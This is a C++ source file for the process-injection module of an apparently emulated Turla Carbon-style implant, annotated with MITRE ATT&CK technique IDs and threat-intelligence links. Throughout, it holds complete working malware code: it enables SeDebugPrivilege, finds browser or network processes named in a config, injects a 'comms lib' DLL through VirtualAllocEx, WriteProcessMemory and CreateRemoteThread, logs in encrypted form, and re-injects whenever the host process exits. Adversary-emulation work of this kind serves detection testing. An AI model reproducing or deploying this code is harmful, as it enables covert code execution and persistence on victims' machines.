#include "../include/injection.h"

namespace injection {

const char* kInjectDllName = "MSXHLP.dll"; // Name of the DWll to inject
const char* kModuleKernel32 = "KERNEL32.DLL"; // Hold the name of the kernel32 module
DWORD hostPID; // hold the PID of the current host of the comms lib

WINBOOL InjectionCallWrapper::OpenProcessTokenWrapper(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle) {
    return OpenProcessToken(ProcessHandle, DesiredAccess, TokenHandle);
}

HANDLE InjectionCallWrapper::GetCurrentProcessWrapper() {
    return GetCurrentProcess();
}

BOOL InjectionCallWrapper::LookupPrivilegeValueWrapper(LPCTSTR lpSystemName, LPCTSTR lpName, PLUID lpLuid) {
    return LookupPrivilegeValue(lpSystemName, lpName, lpLuid);
}

WINBOOL InjectionCallWrapper::AdjustTokenPrivilegesWrapper(HANDLE TokenHandle, WINBOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength) {
    return AdjustTokenPrivileges(TokenHandle, DisableAllPrivileges, NewState, BufferLength, PreviousState, ReturnLength);
}

WINBOOL InjectionCallWrapper::CloseHandleWrapper(HANDLE hObject) {
    return CloseHandle(hObject);
}

HANDLE InjectionCallWrapper::CreateToolhelp32SnapshotWrapper(DWORD dwFlags, DWORD th32ProcessID) {
    return CreateToolhelp32Snapshot(dwFlags, th32ProcessID);
}

WINBOOL InjectionCallWrapper::Process32FirstWrapper(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
    return Process32First(hSnapshot, lppe);
}

WINBOOL InjectionCallWrapper::Process32NextWrapper(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
    return Process32Next(hSnapshot, lppe);
}

HANDLE InjectionCallWrapper::OpenProcessWrapper(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessID) {
    return OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessID);
}

DWORD InjectionCallWrapper::GetLastErrorWrapper() {
    return GetLastError();
}

WINBOOL InjectionCallWrapper::Module32FirstWrapper(HANDLE hSnapshot, LPMODULEENTRY32 lpme) {
    return Module32First(hSnapshot, lpme);
}

WINBOOL InjectionCallWrapper::Module32NextWrapper(HANDLE hSnapshot, LPMODULEENTRY32 lpme){
    return Module32Next(hSnapshot, lpme);
}

FARPROC InjectionCallWrapper::GetProcAddressWrapper(HMODULE hModule, LPCSTR lpProcName) {
    return GetProcAddress(hModule, lpProcName);
}

LPVOID InjectionCallWrapper::VirtualAllocExWrapper(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    return VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
}

WINBOOL InjectionCallWrapper::WriteProcessMemoryWrapper(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
    return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, &*lpNumberOfBytesWritten);
}

HANDLE InjectionCallWrapper::CreateRemoteThreadWrapper(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFLags, LPDWORD lpThreadId) {
    return CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFLags, lpThreadId);
}

// these next 5 functions are wrappers that make unit testing easier

// get the pe.szExeFile value as a string
std::string InjectionCallWrapper::GetPEszExeFile(PROCESSENTRY32 *pe) {
    std::string szExeFile(pe->szExeFile);
    return szExeFile;
}

// get the pe.th32ProcessID value
DWORD InjectionCallWrapper::GetPEth32ProcessID(PROCESSENTRY32 *pe) {
    return pe->th32ProcessID;
}

// get the pe.th32ParentProcessID value
DWORD InjectionCallWrapper::GetPEth32ParentProcessID(PROCESSENTRY32 *pe) {
    return pe->th32ParentProcessID;
}

// get the me.szModule value
std::string InjectionCallWrapper::GetMEszModule(MODULEENTRY32 *me) {
    std::string szModule(me->szModule);
    return szModule;
}

// get the me.hModule value
HMODULE InjectionCallWrapper::GetMEhModule(MODULEENTRY32 *me) {
    return me->hModule;
}

/*
 * EnableDebugPrivs:
 *      About:
 *          Enable the SeDebugPrivilege for the thread performing injection.
 *          This privilege is required to perform DLL injection later.
 *      MITRE ATT&CK Techniques:
 *          T1134: Access Token Manipulation
 *      Result:
 *          Returns ERROR_SUCCESS if successful, returns a failure code if not.
 *          If successful, SeDebugPrivilege will be enabled for this thread.
 */
int EnableDebugPrivs(InjectionCallWrapperInterface* i_call_wrapper) {
    HANDLE hToken; // token to current process
    LUID luid;
    TOKEN_PRIVILEGES tkp;
    int retVal;

    // get a token to the current process that'll allow us to adjust its privs
    retVal = i_call_wrapper->OpenProcessTokenWrapper(i_call_wrapper->GetCurrentProcessWrapper(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    if (retVal == 0) {

        i_call_wrapper->CloseHandleWrapper(hToken);
        std::ostringstream stream;
        stream << "[ERROR-INJ] OpenProcessToken failed. ReturnValue: " << retVal << " GetLastError: " << i_call_wrapper->GetLastErrorWrapper();
        util::logEncrypted(orchestrator::errorLogPath, stream.str());
        return FAIL_DEBUG_PRIVS_OPEN_PROCESS_TOKEN;

    }

    // find what the value for SE_DEBUG is, this isn't static because windows
    BOOL lookupPrivilegeValue = i_call_wrapper->LookupPrivilegeValueWrapper(NULL, SE_DEBUG_NAME, &luid);

    if (!lookupPrivilegeValue) {

        i_call_wrapper->CloseHandleWrapper(hToken);
        util::logEncrypted(orchestrator::errorLogPath, ("[ERROR-INJ] LookupPrivilegeValue failed. GetLastError: " + i_call_wrapper->GetLastErrorWrapper()));
        return FAIL_DEBUG_PRIVS_LOOKUP_PRIV_VALUE;

    }

    // populate fields for TOKEN_PRIVILEGES saying that SE_DEBUG is enabled
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // make the changes to our token's privilieges
    retVal = i_call_wrapper->AdjustTokenPrivilegesWrapper(hToken, false, &tkp, sizeof(tkp), NULL, NULL);

    if (retVal == 0) {

        i_call_wrapper->CloseHandleWrapper(hToken);
        std::ostringstream stream;
        stream << "[ERROR-INJ] AdjustTokenPrivileges failed. ReturnValue: " << retVal << " GetLastError: " << i_call_wrapper->GetLastErrorWrapper();
        util::logEncrypted(orchestrator::errorLogPath, stream.str());
        return FAIL_DEBUG_PRIVS_ADJUST_TOKEN_PRIVS;

    }

    util::logEncrypted(orchestrator::regLogPath, "[INJ] Successfully enabled debug privs.");
    i_call_wrapper->CloseHandleWrapper(hToken);
    return ERROR_SUCCESS;
}

/*
 * GetTargetProcessesVector:
 *      About:
 *          Parse the config file for target processes to inject into.
 *          Generate a vector containing these processes.
 *      Result:
 *          Returns ERROR_SUCCESS if successful, returns a failure code if not.
 *          If successful, the targetProcesses vector will be populated with targets.
 */
int GetTargetProcessesVector(std::vector<std::string> *targetProcesses) {
    std::string targetProcList = "";
    std::string token; // contains each section of the comma delimited list of target processes as targetProcList is being parsed
    
    targetProcList = util::GetConfigValue("PROC", "net_app", orchestrator::configFileContents);

    if (targetProcList == "") {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] targetProcList is empty after GetConfigValue call.");
        return FAIL_CONFIG_FIND_PROCS;
    }

    util::logEncrypted(orchestrator::regLogPath, "[INJ] targetProcList: " + targetProcList);

    if (targetProcList.find(",") != std::string::npos) { // split list of processes by comma, add to the vector
        std::stringstream ss(targetProcList);
        while (getline(ss, token, ',')) {
            if (token.find(".exe") != std::string::npos) {
                targetProcesses->push_back(token);
            }
        }
    } else { // if no commas, assume only one process and add to vector
        targetProcesses->push_back(targetProcList);
    }

    if ((*targetProcesses).empty()) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] targetProcesses is empty after attempting to build vector.");
        return FAIL_CONFIG_POPULATE_VECTOR;
    }

    util::logEncrypted(orchestrator::regLogPath, "[INJ] Successfully build vector of target processes.");
    util::logEncrypted(orchestrator::regLogPath, "[INJ] List of processes: ");
    for (std::string& Process: *targetProcesses) {
        util::logEncrypted(orchestrator::regLogPath, "\t " + Process);
    }

    return ERROR_SUCCESS;
}

// Given a name of a process, return a handle to all instances of it, its PID, and its parent's PID
// Returns ERROR_SUCCESS on success, otherwise some type of FAIL
/*
 * GetProcessVectorsHandlePIDsPPIDs:
 *      About:
 *          Take a snapshot of the currently running processes.
 *          Find all instances of the target process we are looking for.
 *          Populate vectors for handles to the processes, the process IDs
 *          of these processes, and the process IDs of their parent.
 *      MITRE ATT&CK Tecnhiques:
 *          T1057: Process Discovery
 *      Result:
 *      	Returns ERROR_SUCCESS if successful, returns a failure code if not.
 *          If successful, the three aforementioned vectors will be populated
 */
int GetProcessVectorsHandlePIDsPPIDs(InjectionCallWrapperInterface* i_call_wrapper, std::string targetProcessName, std::vector<HANDLE> *vhTargetProcesses, std::vector<DWORD> *vTargetPIDs, std::vector<DWORD> *vTargetParentPIDs) {
    bool foundProcess = FALSE;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    // get a snapshot of all running processes
    HANDLE hSnapshot = i_call_wrapper->CreateToolhelp32SnapshotWrapper(TH32CS_SNAPPROCESS, 1); // In theory, when calling this with TH32CS_SNAPPROCESS, the second arg is ignored
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] CreateToolhelp32Snapshot failed. GetLastError: " + i_call_wrapper->GetLastErrorWrapper());
        i_call_wrapper->CloseHandleWrapper(hSnapshot);
        return FAIL_PROC_VECTOR_CREATE_SNAPSHOT;
    }

    if (i_call_wrapper->Process32FirstWrapper(hSnapshot, &pe) != TRUE) { // if the snapshot has entries, continue
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] Snapshot empty or issue with Process32First. GetLastError: " + i_call_wrapper->GetLastErrorWrapper());
        i_call_wrapper->CloseHandleWrapper(hSnapshot);
        return FAIL_PROC_VECTOR_SNAPSHOT_EMPTY;
    }

    do { // for each entry, check that the process is the one we're looking for. if it is, populate the vectors with its info and continue
        std::string szExeFile = i_call_wrapper->GetPEszExeFile(&pe);
        DWORD th32ProcessID = i_call_wrapper->GetPEth32ProcessID(&pe);
        DWORD th32ParentProcessID = i_call_wrapper->GetPEth32ParentProcessID(&pe);
        if (szExeFile.compare(targetProcessName) == 0) {
            HANDLE hProcess = i_call_wrapper->OpenProcessWrapper(PROCESS_ALL_ACCESS, FALSE, th32ProcessID);
            if (hProcess != NULL) {
                vhTargetProcesses->push_back(hProcess);
                vTargetPIDs->push_back(th32ProcessID);
                vTargetParentPIDs->push_back(th32ParentProcessID);
                foundProcess = TRUE;
                std::ostringstream stream;
                stream << "[INJ] Successfully found " << targetProcessName << " process.";
                util::logEncrypted(orchestrator::regLogPath, stream.str());
                std::ostringstream stream2;
                stream2 << "[INJ] Adding " << szExeFile << " to the vectors. hProcess: " << hProcess << ". PID: " << th32ProcessID << ". PPID: " << th32ParentProcessID;
                util::logEncrypted(orchestrator::regLogPath, stream2.str());
            } else {
                std::ostringstream stream;
                stream << "[WARN-INJ] Error: " << FAIL_PROC_VECTOR_OPEN_PROCESS << ". Encountered an error with OpenProcess for " << szExeFile << ". GetLastError: " << i_call_wrapper->GetLastErrorWrapper() << ". Continuing...";
                util::logEncrypted(orchestrator::regLogPath, stream.str());
            }
            i_call_wrapper->CloseHandleWrapper(hProcess);
        }
    } while (i_call_wrapper->Process32NextWrapper(hSnapshot, &pe) == TRUE);

    i_call_wrapper->CloseHandleWrapper(hSnapshot);

    if (foundProcess == FALSE) { // if we get to this point with foundProcess == FALSE, we didn't find the process
        util::logEncrypted(orchestrator::regLogPath, "[WARN-INJ] Unable to find the process " + targetProcessName + " in the snapshot.");
        return FAIL_PROC_VECTOR_CANNOT_FIND_PROC;
    }

    return ERROR_SUCCESS;
}

/*
 * GetModuleHandleByName:
 *      About:
 *          Get a handle to KERNEL32.dll from the target process.
 *          The handle is used during injection.
 *      Result:
 *      	Returns ERROR_SUCCESS if successful, returns a failure code if not.
 *          If successful, hModule will contain a handle to KERNEL32.dll.
 */
int GetModuleHandleByName(InjectionCallWrapperInterface* i_call_wrapper, std::string moduleName, HMODULE *hModule, DWORD targetPID) {
    MODULEENTRY32 me;
    me.dwSize = sizeof(MODULEENTRY32);

    HANDLE hSnapshot = i_call_wrapper->CreateToolhelp32SnapshotWrapper(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, targetPID); // get a snapshot of all modules for the specified PID
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] CreateToolhelp32Snapshot failed. GetLastError: " + i_call_wrapper->GetLastErrorWrapper());
        i_call_wrapper->CloseHandleWrapper(hSnapshot);
        return FAIL_MOD_HANDLE_CREATE_SNAPSHOT;
    }

    if (i_call_wrapper->Module32FirstWrapper(hSnapshot, &me) != TRUE) { // TRUE if the snapshot has entries
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] Snapshot empty or issue with Module32First. GetLastError: " + i_call_wrapper->GetLastErrorWrapper());
        i_call_wrapper->CloseHandleWrapper(hSnapshot);
        return FAIL_MOD_HANDLE_SNAPSHOT_EMPTY;
    }

    do { // for each entry, check if the module's name is the one we are looking for, and if it is, populate hModule
        std::string szModule = i_call_wrapper->GetMEszModule(&me);
        HMODULE hMod = i_call_wrapper->GetMEhModule(&me);
        if (szModule.compare(moduleName) == 0) {
            *hModule = hMod;
            std::ostringstream stream;
            stream << "[INJ] Successfully obtained handle " << hMod << " for " << moduleName << ".";
            util::logEncrypted(orchestrator::regLogPath, stream.str());
            i_call_wrapper->CloseHandleWrapper(hMod);
            i_call_wrapper->CloseHandleWrapper(hSnapshot);
            return ERROR_SUCCESS;
        }
        i_call_wrapper->CloseHandleWrapper(hMod);
    } while (i_call_wrapper->Module32NextWrapper(hSnapshot, &me) == TRUE);

    i_call_wrapper->CloseHandleWrapper(hSnapshot); // if we haven't returned by this point, we didn't find the module
    util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] Unable to find " + moduleName + " in snapshot.");
    return FAIL_MOD_HANDLE_CANNOT_FIND_MOD;
}

/*
 * PerformInjection:
 *      About:
 *          Perform process injection into the target process.
 *          Use GetProcAddress with the KERNEL32.dll handle to get a pointer to the LoadLibraryA function.
 *          Open a handle to the target process.
 *          Check that we have a valid path for MSXHLP.dll.
 *          Use VirtualAllocEx to allocate memory in the target process for the path to MSXHLP.dll.
 *          Use WriteProcessMemory to write the path to MSXHLP.dll to target process memory.
 *          Finally, use CreateRemoteThread to call LoadLibraryA in the target process
 *          and spawn a new thread running MSXHLP.dll
 *      Artifacts:
 *          Spawns a thread running MSXHLP.dll in the target process.
 *      MITRE ATT&CK Tecnhiques:
 *          T1055.001: Process Injection: Dynamic-link Library Injection
 *      Result:
 *      	Returns ERROR_SUCCESS if successful, returns a failure code if not.
 *          If successful, a thread running MSXHLP.dll will be created in the target process.
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *          https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 */
int PerformInjection(InjectionCallWrapperInterface* i_call_wrapper, std::string targetProcessName, LPCSTR libraryToLoadName, DWORD targetPID, HMODULE *hKERNEL32) {
    LPTHREAD_START_ROUTINE pLoadLibrary = NULL; // pointer to LoadLibraryA
    HANDLE hTargetProcess;
    std::string strDllPath = ""; // dll path
    PVOID baseInjMemAddr; // base address of memory location we're reserving to inject dll
    HANDLE hInjectedThread; // handle to the created thread
    int retVal;

    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wcast-function-type" // ignore this error for casting proc address to compatable type for create remote thread
    pLoadLibrary = (LPTHREAD_START_ROUTINE) i_call_wrapper->GetProcAddressWrapper(*hKERNEL32, libraryToLoadName); // get a pointer to LoadLibraryA to pass to CreateRemoteTHread
    #pragma GCC diagnostic pop

    if (pLoadLibrary == NULL) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] GetProcAddress failed. GetLastError: " + i_call_wrapper->GetLastErrorWrapper());
        i_call_wrapper->CloseHandleWrapper(*hKERNEL32);
        return FAIL_INJ_GET_PROC_ADDRESS;
    }

    hTargetProcess = i_call_wrapper->OpenProcessWrapper(PROCESS_ALL_ACCESS, FALSE, targetPID); // open a handle to the process, used for the last 3 API calls
    if (hTargetProcess == NULL) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] OpenProcess failed. GetLastError: " + i_call_wrapper->GetLastErrorWrapper());
        i_call_wrapper->CloseHandleWrapper(hTargetProcess);
        i_call_wrapper->CloseHandleWrapper(*hKERNEL32);
        return FAIL_INJ_OPEN_PROCESS;
    }

    strDllPath = util::BuildFilePath(kInjectDllName); // make the file path to the dll
    if (strDllPath == "") {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] BuildFilePath failed.");
        i_call_wrapper->CloseHandleWrapper(hTargetProcess);
        i_call_wrapper->CloseHandleWrapper(*hKERNEL32);
        return FAIL_INJ_BUILD_FILE_PATH;
    }

    // check if DLL exists
    std::filesystem::path fsDllPath = strDllPath;
    if (!std::filesystem::exists(fsDllPath)) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] Unable to locate DLL to inject at path: " + strDllPath);
        i_call_wrapper->CloseHandleWrapper(hTargetProcess);
        i_call_wrapper->CloseHandleWrapper(*hKERNEL32);
        return FAIL_INJ_CANT_FIND_DLL;
    }

    char cDllPath[strDllPath.length()+1]; // conver to the file path to a char, API calls don't work otherwise
    strcpy(cDllPath, strDllPath.c_str()); // and it starts as a string cause I'm still learning C++

    baseInjMemAddr = i_call_wrapper->VirtualAllocExWrapper(hTargetProcess, NULL, sizeof cDllPath, MEM_COMMIT, PAGE_READWRITE); // allocate memory for the path to the dll
    if (baseInjMemAddr == NULL) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] VirtualAllocEx failed. GetLastError: " + i_call_wrapper->GetLastErrorWrapper());
        i_call_wrapper->CloseHandleWrapper(hTargetProcess);
        i_call_wrapper->CloseHandleWrapper(*hKERNEL32);
        return FAIL_INJ_VIRTUAL_ALLOC_EX;
    }

    retVal = i_call_wrapper->WriteProcessMemoryWrapper(hTargetProcess, baseInjMemAddr, (LPVOID) cDllPath, sizeof(cDllPath), NULL); // write to the allocated memory
    if (retVal == 0) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] WriteProcessMemory failed. GetLastError: " + i_call_wrapper->GetLastErrorWrapper());
        i_call_wrapper->CloseHandleWrapper(hTargetProcess);
        i_call_wrapper->CloseHandleWrapper(*hKERNEL32);
        return FAIL_INJ_WRITE_PROCESS_MEMORY;
    }

    hInjectedThread = i_call_wrapper->CreateRemoteThreadWrapper(hTargetProcess, NULL, 0, pLoadLibrary, baseInjMemAddr, 0, NULL); // instruct the process to open a thread loading the dll
    if (hInjectedThread == NULL) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] CreateRemoteThread failed. GetLastError: " + i_call_wrapper->GetLastErrorWrapper());
        i_call_wrapper->CloseHandleWrapper(hTargetProcess);
        i_call_wrapper->CloseHandleWrapper(*hKERNEL32);
        i_call_wrapper->CloseHandleWrapper(hInjectedThread);
        return FAIL_INJ_CREATE_REMOTE_THREAD;
    }

    i_call_wrapper->CloseHandleWrapper(hTargetProcess);
    i_call_wrapper->CloseHandleWrapper(*hKERNEL32);
    i_call_wrapper->CloseHandleWrapper(hInjectedThread);

    // save the target's PID so we can track when it exits
    hostPID = targetPID;

    std::ostringstream stream;
    stream << "[INJ] Completed injection into " << targetProcessName << " with PID " << targetPID;
    util::logEncrypted(orchestrator::regLogPath, stream.str());

    return ERROR_SUCCESS;
}

/*
 * InjectionMain:
 *      About:
 *          "main" function that calls other functions to perform injection.
 *          Keeps track of process ID of host that was injected into so that
 *          InjectionManager can reinject MSXHLP.dll if that host dies.
 *      MITRE ATT&CK Tecnhiques:
 *          T1134: Access Token Manipulation
 *          T1057: Process Discovery
 *          T1055.001: Process Injection: Dynamic-link Library Injection
 *      Result:
 *      	Returns ERROR_SUCCESS if successful, returns a failure code if not.
 *          If successful, injection was performed.
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *          https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 */
int InjectionMain(InjectionCallWrapperInterface* i_call_wrapper) {
    int retVal;
    std::vector<int> vInjErrorCodes; // keep track of error codes output during injection
    std::vector<std::string> vInjErrorProcessesNames; // keep track of what processes produced what errors during injection
    std::vector<std::string> vNamesTargetProcesses; // list of names of processes to inject into, populated by GetTargetProcessesVector
    std::vector<DWORD> vBrowserPIDs; // list of PIDs correlating to browsers/target processes, used to check if we injected into the correct procs
    std::vector<std::string> vBrowserNames; // list of namess correlating to browsers/target processes, used to check if we injected into the correct procs
    bool foundValidTarget = FALSE; // tracks if a valid target for injection was found
    bool injSucceed = FALSE; // tracks if there was a successful injection

    retVal = EnableDebugPrivs(i_call_wrapper); // enable debug privs so that we can actually do all of this
    if (retVal != ERROR_SUCCESS) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] EnableDebugPrivs failed.");
        return retVal;
    }

    retVal = GetTargetProcessesVector(&vNamesTargetProcesses); // populate the vTargetProcesses vector
    if (retVal != ERROR_SUCCESS) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-INJ] GetTargetProcessesVector failed.");
        return retVal;
    }

    for (std::string& targetProcessName: vNamesTargetProcesses) { // for each target process, attempt to inject into it
        std::vector<HANDLE> vhTargetProcesses; // vector of the different running processes for a target process
        std::vector<DWORD> vTargetProcessPIDs; // vector of the different PIDs for the running processes for a target process
        std::vector<DWORD> vTargetProcessParentPIDs; // required to be passed to GetProcessVectorsHandlePIDsPPIDs, but not used otherwise
        HMODULE hKERNEL32; // handle to kernel32.dll from the target process

        util::logEncrypted(orchestrator::regLogPath, "[INJ] Beginning injection process for " + targetProcessName);

        retVal = GetProcessVectorsHandlePIDsPPIDs(i_call_wrapper, targetProcessName, &vhTargetProcesses, &vTargetProcessPIDs, &vTargetProcessParentPIDs); // populate the three vectors
        if (retVal != ERROR_SUCCESS) { // if it fails, close the opened handles and push the error codes into the respective vectors
            std::ostringstream stream;
            stream << "[WARN-INJ] GetProcessVectorsHandlePIDsPPIDs failed for process " << targetProcessName << " with error code " << retVal;
            util::logEncrypted(orchestrator::regLogPath, stream.str());

            for (HANDLE& hTargetProc: vhTargetProcesses) {
                i_call_wrapper->CloseHandleWrapper(hTargetProc);
            }
            vInjErrorCodes.push_back(retVal);
            vInjErrorProcessesNames.push_back(targetProcessName);
            continue;
        }

        foundValidTarget = TRUE;

        for (DWORD& PID: vTargetProcessPIDs) { // add the PIDs and names into the respective vectors for use in CheckProcsSpawned
            vBrowserPIDs.push_back(PID);
            vBrowserNames.push_back(targetProcessName);
        }

        retVal = GetModuleHandleByName(i_call_wrapper, kModuleKernel32, &hKERNEL32, vTargetProcessPIDs[0]); // get a handle to KERNEL32.dll
        if (retVal != ERROR_SUCCESS) { // if it fails, close the opened handles and push the error codes into the respective vectors
            std::ostringstream stream;
            stream << "[ERROR-INJ] GetModuleHandleByName failed for process " << targetProcessName << " with error code " << retVal;
            util::logEncrypted(orchestrator::errorLogPath, stream.str());

            for (HANDLE& hTargetProc: vhTargetProcesses) {
                i_call_wrapper->CloseHandleWrapper(hTargetProc);
            }
            vInjErrorCodes.push_back(retVal);
            vInjErrorProcessesNames.push_back(targetProcessName);
            continue;
        }

        std::ostringstream stream;
        stream << "[INJ] Attempting to inject into " << targetProcessName << " with PID " << vTargetProcessPIDs[0];
        util::logEncrypted(orchestrator::regLogPath, stream.str());

        Sleep(2000); // wait for two seconds before injecting in the case where the target process has just started
        retVal = PerformInjection(i_call_wrapper, targetProcessName, "LoadLibraryA", vTargetProcessPIDs[0], &hKERNEL32); // do the injection
        if (retVal != ERROR_SUCCESS) { // if it fails, close the opened handles and push the error codes into the respective vectors
            std::ostringstream stream;
            stream << "[ERROR-INJ] PerformInjection failed for process " << targetProcessName << " with error code " << retVal;
            util::logEncrypted(orchestrator::errorLogPath, stream.str());

            for (HANDLE& hTargetProc: vhTargetProcesses) {
                i_call_wrapper->CloseHandleWrapper(hTargetProc);
            }
            vInjErrorCodes.push_back(retVal);
            vInjErrorProcessesNames.push_back(targetProcessName);
            continue;
        }

        // close opened process handles
        for (size_t i = 0; i < vhTargetProcesses.size(); i++) {
            i_call_wrapper->CloseHandleWrapper(vhTargetProcesses[i]);
        }

        // if we successfully inject, exit the for loop so we don't have multiple comms libs running
        injSucceed = TRUE;
        break;
    }

    // previous large for loop was unable to find a process that matched the target list
    if (!foundValidTarget) {
        return FAIL_INJ_NO_VALID_TARGET;
    }

    if (!injSucceed) {
        return FAIL_INJ_NO_SUCCESSFUL_INJ;
    }

    return ERROR_SUCCESS;
}

/*
 * InjectionManager:
 *      About:
 *          Function called by the orchestrator's main function to manage injection.
 *          Will continuously perform injection and then wait for the process hosting
 *          MSXHLP.dll to exit. When it does, will attempt to inject MSXHLP.dll into
 *          another process.
 *      MITRE ATT&CK Tecnhiques:
 *          T1134: Access Token Manipulation
 *          T1057: Process Discovery
 *          T1055.001: Process Injection: Dynamic-link Library Injection
 */
void InjectionManager(InjectionCallWrapperInterface* i_call_wrapper) {
    int retVal;

    do {
        util::logEncrypted(orchestrator::defaultRegLogPath, "[INJ] Injecting comms lib");

        // execute process injection flow
        retVal = InjectionMain(i_call_wrapper);
        if (retVal != ERROR_SUCCESS) {
            std::ostringstream stream;
            stream << "[ERROR-INJ] InjectionMain failed with error code: " << retVal << ". Retrying in 5 seconds...";
            util::logEncrypted(orchestrator::errorLogPath, stream.str());
            Sleep(5000);
            continue;
        }

        util::logEncrypted(orchestrator::defaultRegLogPath, "[INJ] Completed injecting comms lib");
        orchestrator::commsActiveFlag = TRUE;

        HANDLE process = OpenProcess(SYNCHRONIZE, FALSE, hostPID);
        if (process == NULL) {
            std::ostringstream stream;
            stream << "[ERROR-INJ] Encountered error when attempting to open host process: " << GetLastError() << ". Assuming host process has died and reinjecting";
            util::logEncrypted(orchestrator::errorLogPath, stream.str());
            util::logEncrypted(orchestrator::defaultRegLogPath, "[WARN-INJ] Reinjecting due to error, see error log");
            Sleep(5000);
            continue;
        }

        DWORD ret = WaitForSingleObject(process, INFINITE);
        CloseHandle(process);
        orchestrator::commsActiveFlag = FALSE;
        if (ret != WAIT_OBJECT_0) {
            std::ostringstream stream;
            stream << "[ERROR-INJ] Encountered error when attempting to wait for host process: " << GetLastError() << ". Return value: " << ret << ". Reinjecting";
            util::logEncrypted(orchestrator::errorLogPath, stream.str());
            util::logEncrypted(orchestrator::defaultRegLogPath, "[WARN-INJ] Reinjecting due to error, see error log");
            Sleep(5000);
            continue;
        }

        util::logEncrypted(orchestrator::defaultRegLogPath, "[WARN-INJ] Comms lib host process has died. Attempting to reinject");
        Sleep(5000);

    } while(true);
}

} //namespace injection
